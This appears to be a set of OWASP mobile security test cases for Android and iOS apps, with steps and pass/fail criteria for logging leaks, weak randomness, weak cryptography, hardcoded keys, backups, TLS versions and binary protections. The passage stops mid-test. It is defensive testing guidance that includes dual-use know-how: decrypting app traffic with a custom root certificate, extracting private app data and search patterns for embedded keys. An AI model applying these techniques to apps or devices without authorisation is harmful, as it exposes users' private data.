On Android platforms, logging APIs like `Log`, `Logger`, `System.out.print`, `System.err.print`, and `java.lang.Throwable#printStackTrace` can inadvertently lead to the leakage of sensitive information. Log messages are recorded in logcat, a shared memory buffer, accessible since Android 4.1 (API level 16) only to privileged system applications that declare the `READ_LOGS` permission. Nonetheless, the vast ecosystem of Android devices includes pre-loaded apps with the `READ_LOGS` privilege, increasing the risk of sensitive data exposure. Therefore, direct logging to logcat is generally advised against due to its susceptibility to data leaks.

## Steps

1. Install and run the app.
2. Navigate to the screen of the mobile app you want to analyse the log output from.
3. Execute a method trace (@MASTG-TECH-0033) (using e.g. @MASTG-TOOL-0001) by attaching to the running app, targeting logging APIs and save the output.

## Observation

The output should contain a list of locations where logging APIs are used in the app for the current execution.

## Evaluation

The test case fails if you can find sensitive data being logged using those APIs.
## Insecure Random API Usage

## Overview

Android apps sometimes use an insecure [pseudorandom number generator (PRNG)](../../../Document/0x05e-Testing-Cryptography.md#random-number-generation), such as [`java.util.Random`](https://developer.android.com/reference/java/util/Random), which is a linear congruential generator and produces a predictable sequence for any given seed value. As a result, `java.util.Random` and `Math.random()` ([the latter](https://franklinta.com/2014/08/31/predicting-the-next-math-random-in-java/) simply calls `nextDouble()` on a static `java.util.Random` instance) generate reproducible sequences across all Java implementations whenever the same seed is used. This predictability makes them unsuitable for cryptographic or other security-sensitive contexts.

In general, if a PRNG is not explicitly documented as being cryptographically secure, it should not be used where randomness must be unpredictable. Refer to the [Android Documentation](https://developer.android.com/privacy-and-security/risks/weak-prng) and the ["random number generation" guide](../../../Document/0x05e-Testing-Cryptography.md#random-number-generation) for further details.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool on the app and look for insecure random APIs, or you can use @MASTG-TECH-0033 to detect the use of such APIs.
2. For each of the identified API uses, check if they are used in a security relevant context. You can decompile the app (@MASTG-TECH-0017) and inspect the code (@MASTG-TECH-0023) to confirm.

## Observation

The output should contain a list of locations where insecure random APIs are used.

## Evaluation

The test case fails if you can find random numbers generated using those APIs that are used in security-relevant contexts, such as generating passwords or authentication tokens.
## Non-random Sources Usage

## Overview

Android applications sometimes use non-random sources to generate "random" values, leading to potential security vulnerabilities. Common practices include relying on the current time, such as `Date().getTime()`, or accessing `Calendar.MILLISECOND` to produce values that are easily guessable and reproducible.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool on the app and look for uses of non-random sources.

## Observation

The output should contain a list of locations where non-random sources are used.

## Evaluation

The test case fails if you can find security-relevant values, such as passwords or tokens, generated using non-random sources.
## Undeclared PII in Network Traffic Capture

## Overview

Attackers may capture network traffic from Android devices using an intercepting proxy, such as @MASTG-TOOL-0079, @MASTG-TOOL-0077, or @MASTG-TOOL-0097, to analyze the data being transmitted by the app. This works even if the app uses HTTPS, as the attacker can install a custom root certificate on the Android device to decrypt the traffic. Inspecting traffic that is not encrypted with HTTPS is even easier and can be done without installing a custom root certificate for example by using @MASTG-TOOL-0081.

The goal of this test is to verify that sensitive data, specifically PII, is not being sent over the network, even if the traffic is encrypted. This test is especially important for apps that handle sensitive data, such as financial or health data, and should be performed in conjunction with a review of the app's privacy policy and the app's marketplace privacy declarations (e.g., Data Safety section in Google Play).

## Steps

1. Start the device.
2. Start logging sensitive data from network traffic (@MASTG-TECH-0100). For example using @MASTG-TOOL-0097.
3. Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Especially, places where you know that will trigger network traffic.

## Observation

The output should contain a network traffic log that includes the decrypted HTTPS traffic.

## Evaluation

The test case fails if you can find the PII you entered in the app that is not declared in the app's marketplace privacy declarations (e.g., Data Safety section in Google Play) and/or in its privacy policy.

Note that this test does not provide any code locations where the sensitive data is being sent over the network. In order to identify the code locations, you can use static analysis tools like @MASTG-TOOL-0110 or dynamic analysis tools like @MASTG-TOOL-0031. Consult @MASTG-TEST-0318 and @MASTG-TEST-0319, respectively, for more details.
## Runtime Storage of Unencrypted Data in the App Sandbox

## Overview

The goal of this test is to retrieve the files written to the internal storage (@MASTG-KNOW-0041) and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage (@MASTG-TECH-0002) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.

## Steps

1. Start the device.

2. Take a first copy of the app's private data directory (@MASTG-TECH-0008) to have as a reference for offline analysis. You can use @MASTG-TOOL-0004 for example.

3. Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Taking note of the data you input can help identify it later using tools to search for it.

4. Take a second copy of the app's private data directory for offline analysis and make a diff using the first copy to identify all files created or modify during your testing session.

## Observation

The output should contain a list of files that were created in the app's private storage during execution.

## Evaluation

The test case fails if you find any sensitive data (keys, passwords, or any data inputted into the app) in the extracted files.

When evaluating the data, attempt to identify and decode data that has been encoded using methods such as base64 encoding, hexadecimal representation, URL encoding, escape sequences, wide characters and common data obfuscation methods such as xoring. Also consider identifying and decompressing compressed files such as tar or zip. These methods obscure but do not protect sensitive data.
## Insufficient Key Sizes

## Overview

In this test case, we will look for the use insufficient key sizes in iOS apps. To do this, we need to focus on the cryptographic frameworks and libraries that are available in iOS and the methods that are used to generate cryptographic keys.

- **CommonCrypto**: The [`CCCrypt`](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html) function is used for symmetric encryption and decryption and specifies the key size or key length in its fifth parameter `keyLength`.
- **Security**: The [`SecKeyCreateRandomKey`](https://developer.apple.com/documentation/security/1823694-seckeycreaterandomkey) function is used to generate a random key using certain attributes including [`kSecAttrKeyType`](https://developer.apple.com/documentation/security/ksecattrkeytype) and [`kSecAttrKeySizeInBits`](https://developer.apple.com/documentation/security/ksecattrkeysizeinbits). The [`SecKeyGeneratePair`](https://developer.apple.com/documentation/security/1395339-seckeygeneratepair) function is deprecated in iOS 16.
- **CryptoKit**: The [`AES.GCM`](https://developer.apple.com/documentation/cryptokit/aes/gcm) and [`ChaChaPoly`](https://developer.apple.com/documentation/cryptokit/chachapoly) classes are used for symmetric encryption and decryption.

Since you don't usually generate keys directly in CryptoKit (the library does that for you automatically), we'll focus on the CommonCrypto and Security libraries in this test.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, or use a dynamic analysis tool like @MASTG-TOOL-0039, and look for uses of the cryptographic functions that generate keys.

## Observation

The output should contain the disassembled code of the functions using `CCCrypt` or other cryptographic functions.

## Evaluation

The test case fails if you can find the use of insufficient key sizes within the source code. For example, a 1024-bit key size is considered insufficient for RSA encryption and a 128-bit key size is considered insufficient for AES encryption considering quantum computing attacks.
## Broken Symmetric Encryption Algorithms

## Overview

To test for the use of broken encryption algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.

- **CommonCrypto**: The [`CCCrypt`](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html) function is used for **symmetric algorithms** and specifies the algorithm in its second parameter `alg` which can be one of the following [`CCAlgorithm`](https://github.com/Apple-FOSS-Mirror/CommonCrypto/blob/v60026/CommonCrypto/CommonCryptor.h#L149-L158) constants:
    - `kCCAlgorithmAES128`
    - `kCCAlgorithmDES`
    - `kCCAlgorithm3DES`
    - `kCCAlgorithmCAST`
    - `kCCAlgorithmRC4`
    - `kCCAlgorithmRC2`
    - `kCCAlgorithmBlowfish`

- **CryptoKit**: This library does not support weak encryption algorithms. It only supports secure **symmetric algorithms** including AES-GCM and ChaChaPoly.
- **Third-party libraries**: Applications may include cryptographic functions through third-party libraries such as OpenSSL, BoringSSL, Libsodium, or even custom cryptographic implementations. These may support or expose weak encryption algorithms like DES, 3DES, RC2, RC4, or Blowfish.

Note: the **Security** framework only supports asymmetric algorithms and is therefore out of scope for this test (see [note about symmetric keys](https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/generating_new_cryptographic_keys#2863931)).

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, or use a dynamic analysis tool like @MASTG-TOOL-0039, and look for uses of the cryptographic functions that perform encryption and decryption operations.

## Observation

The output should contain the disassembled code of the functions using the relevant cryptographic functions.

## Evaluation

The test case fails if you can find the use of broken encryption algorithms within the source code. For example:

- DES
- 3DES
- RC2
- RC4
- Blowfish

This applies to Apple-provided APIs (e.g., CommonCrypto), third-party libraries (e.g., OpenSSL, Libsodium) and any custom implementations of cryptographic routines that replicate insecure algorithms (e.g., [DES in C code](https://github.com/tarequeh/DES/blob/master/des.c)) or use insecure configurations (e.g., ECB mode, short key sizes).

**Stay up-to-date**: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region.

Some algorithms may not be considered broken as a whole, but may have **risky configurations** that should be avoided. For example, using a seed or IV that is not generated by a cryptographically secure pseudorandom number generator (CSPRNG) or that is not considered quantum-safe. For instance, an AES 128-bit key size is insufficient in the face of quantum computing attacks. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from [NIST IR 8547 "Transition to Post-Quantum Cryptography Standards", 2024](https://csrc.nist.gov/pubs/ir/8547/ipd).

**Context Considerations**:

To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.
## Broken Hashing Algorithms

## Overview

To test for the use of broken hashing algorithms in iOS apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform hashing operations.

- **CommonCrypto**: [CommonDigest.h](https://web.archive.org/web/20240606000312/https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonDigest.h) defines the following **hashing algorithms**:
    - `CC_MD2`
    - `CC_MD4`
    - `CC_MD5`
    - `CC_SHA1`
    - `CC_SHA224`
    - `CC_SHA256`
    - `CC_SHA384`
    - `CC_SHA512`

- **CryptoKit**: Supports three cryptographically secure **hashing algorithms** and two insecure ones in a dedicated class called [`Insecure`](https://developer.apple.com/documentation/cryptokit/insecure):
    - `SHA256`
    - `SHA384`
    - `SHA512`
    - `Insecure.MD5`
    - `Insecure.SHA1`

Note: the **Security** framework only supports asymmetric algorithms and is therefore out of scope for this test.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, or use a dynamic analysis tool like @MASTG-TOOL-0039, and look for uses of the cryptographic functions that perform hashing operations.

## Observation

The output should contain the disassembled code of the functions using the relevant cryptographic functions.

## Evaluation

The test case fails if you can find the use of broken hashing algorithms within the source code. For example:

- MD5
- SHA-1

**Stay up-to-date**: This is a non-exhaustive list of broken algorithms. Make sure to check the latest standards and recommendations from organizations such as the National Institute of Standards and Technology (NIST), the German Federal Office for Information Security (BSI) or any other relevant authority in your region. This is important when building an app that uses data that will be stored for a long time. Make sure you follow the NIST recommendations from [NIST IR 8547 "Transition to Post-Quantum Cryptography Standards", 2024](https://csrc.nist.gov/pubs/ir/8547/ipd).

**Context Considerations**:

To reduce false positives, make sure you understand the context in which the algorithm is being used before reporting the associated code as insecure. Ensure that it is being used in a security-relevant context to protect sensitive data.

For example, using the broken algorithm MD5 for hashing passwords is disallowed by NIST, as it is no longer considered secure for cryptographic purposes. However, using MD5 for checksums or other non-cryptographic tasks, where security is not a concern, is generally acceptable.
## Use of Hardcoded Cryptographic Keys in Code

## Overview

In this test case, we will look for the use of hardcoded keys in Android applications. To do this, we need to focus on the cryptographic implementations of hardcoded keys. The Java Cryptography Architecture (JCA) provides the [`SecretKeySpec`](https://developer.android.com/reference/javax/crypto/spec/SecretKeySpec) class, which allows you to create a [`SecretKey`](https://developer.android.com/reference/javax/crypto/SecretKey) from a byte array.

## Steps

1. Use either @MASTG-TECH-0014 with a tool such as @MASTG-TOOL-0110 or @MASTG-TECH-0033 (dynamic analysis) with a tool like @MASTG-TOOL-0001 to identify all the instances of symmetric key encryption in code and look for uses of the hardcoded cryptographic keys.

## Observation

The output should contain a list of locations where hardcoded keys are used.

## Evaluation

The test case fails if you find any hardcoded keys that are used in security-sensitive contexts.
## Use of Hardcoded Cryptographic Keys in Code

## Overview

In this test case, we will examine iOS applications for the presence of hardcoded cryptographic keys. Hardcoded keys can be typically found in calls to cryptographic functions or stored as constants or variables within the code. In iOS, cryptographic keys are often used in the following frameworks:

- **Security Framework**: The [`SecKeyCreateWithData`](https://developer.apple.com/documentation/security/seckeycreatewithdata(_:_:_:)) function allows developers to create a cryptographic key from raw data.
- **CommonCrypto**: The [`CCCrypt`](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html) can be initialized with raw key data in its `key` parameter.
- **CryptoKit**: Although `CryptoKit` provides higher-level abstractions for cryptographic operations, developers might still hardcode cryptographic keys in different formats and feed it to methods like [`P256.Signing.PrivateKey.init(rawRepresentation:)`](https://developer.apple.com/documentation/cryptokit/p256/signing/privatekey/init(rawrepresentation:)) or similar.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary looking for cryptographic APIs as indicated above.

## Observation

The output should include any instances where the app uses cryptographic functions that accept raw key data. Whenever possible, the output should also try to point to the raw key data from the binary.

## Evaluation

The test case fails if calls to cryptographic functions with hardcoded keys are found within binary.

You may find the keys being directly passed as arguments to cryptographic functions (byte arrays or string literals) or stored in variables or constants within the code. Typical representations of hardcoded keys include:

- **Raw Byte Arrays**: Cryptographic keys may be directly embedded in the code as arrays of `UInt8` or `Data` objects. For example, a 256-bit AES key might be represented as a `[UInt8]` array.
- **Base64-Encoded Strings**: Developers might encode cryptographic keys as Base64 strings within the code, which can be easily decoded by attackers if discovered.
- **Hex-Encoded Strings**: Keys are sometimes stored as hexadecimal strings, which are then converted to `Data` objects at runtime for cryptographic operations.

Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).
## Hardcoded Cryptographic Keys in Files

## Overview

Cryptographic keys may be embedded files such as configuration files or key files, certificate files, or other resource files bundled with the app, making them accessible to anyone who can extract the app's resources. Real-world cases include storing API keys, SSL/TLS private keys, or encryption keys within these files, which can lead to serious security vulnerabilities if the app is reverse-engineered.

- **Identified by File Extension**: Files with extensions such as `.key`, `.pem`, `.crt`, `.p12`, `.cer`, or `.der` often contain cryptographic keys or certificates.
- **Identified by PEM Markers**: Strings such as `-----BEGIN PRIVATE KEY-----`, `-----BEGIN CERTIFICATE-----`, or the byte sequence `0x2d 0x2d 0x2d 0x2d 0x2d` (representing `-----` in ASCII) within files indicate the presence of PEM-encoded keys or certificates.
- **Identified by Common Byte Patterns**: Binary files containing specific byte sequences that match known DER or PKCS#12 formats, such as `0x30 0x82` (indicating the start of a DER-encoded structure), can indicate the presence of cryptographic material.
- **Embedded in Property Lists or JSON Files**: Keys might be stored within `.plist` or `.json` configuration files, often encoded as Base64 strings.
- **Identified by Specific Strings**: Keywords such as `privateKey`, `key`, or `secret` within files or variable names can indicate embedded keys or sensitive data.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary looking for strings or sequences of bytes as indicated above.

## Observation

The output should include any instances where potential cryptographic keys are found hardcoded within the application's source code or binary.

## Evaluation

The test case fails if hardcoded cryptographic keys are found within the source code or binary.

Ensure that any identified keys are indeed cryptographic keys used for security-relevant purposes. Avoid false positives by verifying the key's usage context (e.g., configuration settings or non-security-related constants might be misidentified as cryptographic keys).
## Sensitive Data Not Marked For Backup Exclusion

## Overview

This test verifies whether your app uses the `isExcludedFromBackup` API to instruct the system to exclude sensitive files from backups. This API [does not guarantee the actual exclusion](https://developer.apple.com/documentation/foundation/optimizing_your_app_s_data_for_icloud_backup/#3928527). According to the documentation:

> "The `isExcludedFromBackup` resource value exists only to provide guidance to the system about which files and directories it can exclude; it's not a mechanism to guarantee those items never appear in a backup or on a restored device."

In this test, we identify all locations where the `isExcludedFromBackup` API is used to mark files that might still end up in a backup.

!!! note
    Files stored in an app's `/tmp` and `/Library/Caches` directories are **excluded** from iCloud backups. These directories are intended for temporary or cache data, and the system may automatically delete their contents at any time to free up space. Therefore, you don't need to mark these files with `isExcludedFromBackup`. For more details, see the [Apple documentation](https://developer.apple.com/documentation/foundation/optimizing-your-app-s-data-for-icloud-backup#Exclude-Purgeable-Data).

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary, or use a dynamic analysis tool like @MASTG-TOOL-0039, and look for uses of the `isExcludedFromBackup` API.

## Observation

The output should contain the disassembled code of the functions using `isExcludedFromBackup`, and, if possible, the list of affected files.

## Evaluation

The test case fails if the `isExcludedFromBackup` API is used and any of the affected files are considered sensitive.

For any sensitive files found, in addition to using `isExcludedFromBackup`, make sure to encrypt them, as `isExcludedFromBackup` does not guarantee exclusion.
## Sensitive Data Not Excluded From Backup

## Overview

This test verifies whether apps correctly instruct the system to exclude sensitive files from backups by performing a backup and restore of the app data and checking which files are restored.

See @MASTG-TEST-0262 for a static analysis counterpart.

Android provides a way to start the backup daemon to back up and restore app files, which you can use to verify which files are actually restored from the backup.

## Steps

1. Start the device.
2. Install an app on your device.
3. Launch and use the app going through the various workflows while inputting sensitive data wherever you can.
4. Perform a backup and restore of the app data (@MASTG-TECH-0128).
5. Uninstall and reinstall the app but don't open it anymore.
6. Restore the data from the backup and get the list of restored files.

## Observation

The output should contain a list of files that are restored from the backup.

## Evaluation

The test case fails if any of the files are considered sensitive.
## Insecure TLS Protocols Explicitly Allowed in Code

## Overview

The Android Network Security Configuration does not provide direct control over specific TLS versions (unlike [iOS](https://developer.apple.com/documentation/bundleresources/information_property_list/nsexceptionminimumtlsversion)), and starting with Android 10, [TLS v1.3 is enabled by default](https://developer.android.com/privacy-and-security/security-ssl#Updates%20to%20SSL) for all TLS connections.

There are still several ways to enable insecure versions of TLS, including:

### Java Sockets

An app can obtain an SSLContext using an insecure TLS protocol by calling `SSLContext.getInstance("TLSv1.1")` and can also enable specific, potentially insecure, protocol versions using the API call `javax.net.ssl.SSLSocket.setEnabledProtocols(String[] protocols)`.

### Third-party Libraries

Some third-party libraries, such as [OkHttp](https://square.github.io/okhttp/), [Retrofit](https://square.github.io/retrofit/) or Apache HttpClient, provide custom configurations for TLS protocols. These libraries may allow enabling outdated protocols if not carefully managed:

For example, using `ConnectionSpec.COMPATIBLE_TLS` in OkHttp (via `okhttp3.ConnectionSpec.Builder.connectionSpecs(...)`) can lead to insecure TLS versions, like TLS 1.1, being enabled by default in certain versions. Refer to OkHttp's [configuration history](https://square.github.io/okhttp/security/tls_configuration_history/) for details on supported protocols.

The API call `okhttp3.ConnectionSpec.Builder.tlsVersions(...)` can also be used to set the enabled protocols ([OkHttp documentation](https://square.github.io/okhttp/features/https/)).

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Run a static analysis (@MASTG-TECH-0014) tool on the reverse engineered app targeting calls to APIs setting the TLS protocol.

## Observation

The output should contain a list of all enabled TLS versions in the above mentioned API calls.

## Evaluation

The test case fails if any [insecure TLS version](../../../Document/0x04f-Testing-Network-Communication.md#recommended-tls-settings) is directly enabled, or if the app enabled any settings allowing the use of outdated TLS versions, such as `okhttp3.ConnectionSpec.COMPATIBLE_TLS`.
## Insecure TLS Protocols in Network Traffic

## Overview

While static analysis can identify configurations that allow insecure TLS versions, it may not accurately reflect the actual protocol used during live communications. This is because TLS version negotiation occurs between the client (app) and the server at runtime, where they agree on the most secure, mutually supported version.

By capturing and analyzing real network traffic, you can observe the TLS version actually negotiated and in use. This approach provides an accurate view of the protocol's security, accounting for the server's configuration, which may enforce or limit specific TLS versions.

In cases where static analysis is either incomplete or infeasible, examining network traffic can reveal instances where insecure TLS versions (e.g., TLS 1.0 or TLS 1.1) are actively in use.

## Steps

1. Set up @MASTG-TECH-0010 (for Android) or @MASTG-TECH-0062 (for iOS).
2. View the TLS version e.g., using @MASTG-TOOL-0081.

## Observation

The output should contain the TLS version actually used during the connection.

## Evaluation

The test case fails if any [insecure TLS version](../../../Document/0x04f-Testing-Network-Communication.md#recommended-tls-settings) is used.
## Testing for Debugging Symbols

## Overview

This test case checks for [debugging symbols](https://mas.owasp.org/MASWE/MASVS-RESILIENCE/MASWE-0093/) in all binaries contained in the app.

Debugging symbols are added by the [compiler to ease development](https://developer.apple.com/documentation/xcode/building-your-app-to-include-debugging-information "Building your app to include debugging information") and allow symbolication of crashes. However, they can also be used to reverse engineer the app and should not be present in a released app. [Symbolication can also be performed](https://developer.apple.com/documentation/xcode/adding-identifiable-symbol-names-to-a-crash-report "Adding identifiable symbol names to a crash report") with a separate dSYM file.

To manage debugging symbols in Xcode, developers can adjust the following build settings:

- **Generate Debug Symbols**: Xcode adds debugging symbols if the setting [`"Build Settings" > "Apple Clang - Code Generation" > "Generate Debug Symbols"`](https://developer.apple.com/documentation/xcode/build-settings-reference#Generate-Debug-Symbols) is set to `"Yes"`.
- **Debug Information Format**: Found under [`"Build Settings" > "Build Options > "Debug Information Format"`](https://developer.apple.com/documentation/xcode/build-settings-reference#Debug-Information-Format), this setting determines the format of the debug information. Options include:
    - **DWARF**: Embeds debugging information directly into the binary.
    - **DWARF with dSYM File**: Generates a separate dSYM file containing debugging information.

Note that in compiled iOS applications, symbol names may undergo **name mangling** and additional **obfuscation techniques** to further obscure them, making reverse engineering more challenging. While demangling tools can decode standard mangled names (see @MASTG-TECH-0114), they may not effectively reverse custom obfuscation methods.

## Steps

1. Apply @MASTG-TECH-0058 to extract the contents from the IPA file.
2. For all executables and libraries of the app, use @MASTG-TECH-0113 to verify there are no debugging symbols present.

## Observation

The output should contain a list of symbols for each executable and library.

## Evaluation

The test case fails if there are symbols marked as debug symbols in the output.

Before releasing an iOS app, verify that the `"Build Settings" > "Apple Clang - Code Generation" > "Generate Debug Symbols"` setting is set to `"No"`. Additionally, utilize tools like the ones used in @MASTG-TECH-0113 to inspect the final binaries for any residual debugging symbols.

For release builds, it's advisable to set `"Build Settings" > "Build Options > "Debug Information Format"` to `"DWARF with dSYM File"` and ensure that the dSYM files are securely stored and not distributed with the app. This approach facilitates post-release crash analysis without exposing debugging symbols in the distributed binary.
## Usage of Outdated Code Signature Format

## Overview

On iOS, code signatures verify the integrity and authenticity of an app's binary, preventing unauthorized modifications and ensuring that the app is trusted by the operating system. Apple regularly updates its [code signature formats](https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format) to enhance cryptographic strength and improve protection against tampering.

Using an outdated code signature format may expose the app to security risks, as older formats may lack support for current cryptographic standards and may be more vulnerable to manipulation. Adopting the latest code signature format helps maintain app integrity and ensures compatibility with the latest security features in iOS.

## Steps

1. Extract the package as described in @MASTG-TECH-0058.
2. Obtain the version of the code signature format as described in @MASTG-TECH-0112.

## Observation

The output should contain the version of the code signature format.

## Evaluation

The test case fails if the version is below the [recommended one](https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format "Apple Developer").

Ensure that the app is using the [latest code signing format](https://developer.apple.com/documentation/xcode/using-the-latest-code-signature-format "Apple Developer"). You can retrieve the signing certificate format with @MASTG-TECH-0112. This will ensure that the integrity of the app is protected according to the latest cryptographic standards, preventing tampering with the app binary and ensuring that the unmodified copy is distributed to users.
## Broken Symmetric Encryption Algorithms

## Overview

To test for the [use of broken encryption algorithms](../../../Document/0x04g-Testing-Cryptography.md#identifying-insecure-andor-deprecated-cryptographic-algorithms) in Android apps, we need to focus on methods from cryptographic frameworks and libraries that are used to perform encryption and decryption operations.

- [`Cipher.getInstance`](https://developer.android.com/reference/javax/crypto/Cipher#getInstance(java.lang.String)): Initializes a Cipher object for encryption or decryption. The `algorithm` parameter can be one of the [supported algorithms](https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#Cipher).
- [`SecretKeyFactory.getInstance`](https://developer.android.com/reference/javax/crypto/SecretKeyFactory#getInstance(java.lang.String)): Returns a SecretKeyFactory object that converts keys into key specifications and vice versa. The `algorithm` parameter can be one of the [supported algorithms](https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#SecretKeyFactory).
- [`KeyGenerator.getInstance`](https://developer.android.com/reference/javax/crypto/KeyGenerator#getInstance(java.lang.String)): Returns a `KeyGenerator` object that generates secret keys for symmetric algorithms. The `algorithm` parameter can be one of the [supported algorithms](https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#KeyGenerator).

Some broken symmetric encryption algorithms include:

- **DES (Data Encryption Standard)**: 56-bit key, breakable, [withdrawn by NIST in 2005](https://csrc.nist.gov/pubs/fips/46-3/final).
- **3DES (Triple DES, officially the Triple Data Encryption Algorithm (TDEA or Triple DEA))**: 64-bit block size, [vulnerable to Sweet32 birthday attacks](https://sweet32.info/), [withdrawn by NIST on January 1, 2024](https://csrc.nist.gov/pubs/sp/800/67/r2/final).
- **RC4**: Predictable key stream, allows plaintext recovery [RC4 Weakness](https://www.rc4nomore.com/), disapproved by [NIST](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-52r1.pdf) in 2014 and prohibited by [IETF](https://datatracker.ietf.org/doc/html/rfc7465) in 2015.
- **Blowfish**: 64-bit block size, [vulnerable to Sweet32 attacks](https://en.wikipedia.org/wiki/Birthday_attack), never FIPS-approved, and listed under ["Non-Approved algorithms" in FIPS](https://csrc.nist.gov/csrc/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp2092.pdf).

Android also provides additional guidance on [broken cryptographic algorithms](https://developer.android.com/privacy-and-security/risks/broken-cryptographic-algorithm).

## Steps

1. Run @MASTG-TECH-0014 with a tool such as @MASTG-TOOL-0110 on the app binary, or use @MASTG-TECH-0033 (dynamic analysis) with a tool like @MASTG-TOOL-0001, and look for uses of the cryptographic functions that perform encryption and decryption operations.

## Observation

The output should contain a list of locations where insecure symmetric encryption algorithms are used.

## Evaluation

The test case fails if you can find [insecure or deprecated](../../../Document/0x04g-Testing-Cryptography.md#identifying-insecure-andor-deprecated-cryptographic-algorithms) encryption algorithms being used.
## Position Independent Code (PIC) Not Enabled

## Overview

This test case checks if the [native libraries](../../../Document/0x04h-Testing-Code-Quality.md#binary-protection-mechanisms) of the app are compiled without enabling [Position Independent Code (PIC)](../../../Document/0x04h-Testing-Code-Quality.md#position-independent-code), a common mitigation technique against memory corruption attacks.

Since Android 5.0 (API level 21), Android requires [all dynamically linked executables to support PIE](https://source.android.com/docs/security/enhancements/#android-5).

> [Build System Maintainers Guide - Additional Required Arguments](https://android.googlesource.com/platform/ndk/%2B/master/docs/BuildSystemMaintainers.md#additional-required-arguments): Android requires Position-independent executables beginning with API 21. Clang builds PIE executables by default. If invoking the linker directly or not using Clang, use `-pie` when linking.

## Steps

1. Extract the app contents (@MASTG-TECH-0007).
2. Run @MASTG-TECH-0115 on each shared library and grep for "pic" or the corresponding keyword used by the selected tool.

## Observation

The output should list if PIC is enabled or disabled.

## Evaluation

The test case fails if PIC is disabled.
## Stack Canaries Not Enabled

## Overview

This test case checks if the native libraries of the app are compiled without common binary protection mechanisms (@MASTG-KNOW-0006) such as stack smashing protection, a mitigation technique against buffer overflow attacks.

- NDK libraries should have stack canaries enabled since [the compiler does it by default](https://android.googlesource.com/platform/ndk/%2B/master/docs/BuildSystemMaintainers.md#additional-required-arguments).
- Other custom C/C++ libraries might not have stack canaries enabled because they lack the necessary compiler flags (`-fstack-protector-strong`, or `-fstack-protector-all`) or the canaries were optimized out by the compiler. See the [Evaluation](#evaluation) section for more details.

## Steps

1. Extract the app contents (@MASTG-TECH-0058).
2. Run @MASTG-TECH-0115 on each shared library and grep for "canary" or the corresponding keyword used by the selected tool.

## Observation

The output should show if stack canaries are enabled or disabled.

## Evaluation

The test case fails if stack canaries are disabled.

Developers need to ensure that the flags `-fstack-protector-strong`, or `-fstack-protector-all` are set in the compiler flags for all native libraries. This is especially important for custom C/C++ libraries that are not part of the NDK.

When evaluating this please note that there are potential **expected false positives** for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.

The following examples cover some of the false positive cases that might be encountered:

### Use of Memory Safe Languages

The Flutter framework does not use stack canaries because of the way [Dart mitigates buffer overflows](https://docs.flutter.dev/reference/security-false-positives#shared-objects-should-use-stack-canary-values).

### Compiler Optimizations

Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some [react native apps](https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068). They are built with `-fstack-protector-strong` but when attempting to search for `stack_chk_fail` inside the `.so` files, it is not found.

- **Empty .so files**: Some .so files such as `libruntimeexecutor.so` or `libreact_render_debug.so` are effectively empty in release and therefore contain no symbols. Even if you were to attempt to build with `-fstack-protector-all`, you still won't be able to see the `stack_chk_fail` string as there are no method calls there.
- **Lack of stack buffer calls**: Other files such as `libreact_utils.so`, `libreact_config.so`, and `libreact_debug.so` are not empty and contain method calls, but those methods don't contain stack buffer calls, so there are no `stack_chk_fail` strings inside them.

The React Native developers in this case declare that they won't be adding `-fstack-protector-all` as, in their case, [they consider that doing so will add a performance hit for no effective security gain](https://github.com/OWASP/mastg/pull/3049#pullrequestreview-2420837259).
## Usage of Insecure APK Signature Version

## Overview

Not using newer APK signing schemes means that the app lacks the enhanced security provided by more robust, updated mechanisms.

This test checks if the outdated v1 signature scheme is enabled. The v1 scheme is vulnerable to certain attacks, such as the "Janus" vulnerability ([CVE-2017-13156](https://nvd.nist.gov/vuln/detail/CVE-2017-13156)), because it does not cover all parts of the APK file, allowing malicious actors to potentially **modify parts of the APK without invalidating the signature**. Relying solely on v1 signing therefore increases the risk of tampering and compromises app security.

To learn more about APK Signing Schemes, see ["Signing Process"](../../../Document/0x05a-Platform-Overview.md#signing-process).

## Steps

1. Obtain the `minSdkVersion` attribute from the AndroidManifest.xml, e.g., via @MASTG-TECH-0117.
2. List all used signature schemes as shown in @MASTG-TECH-0116.

## Observation

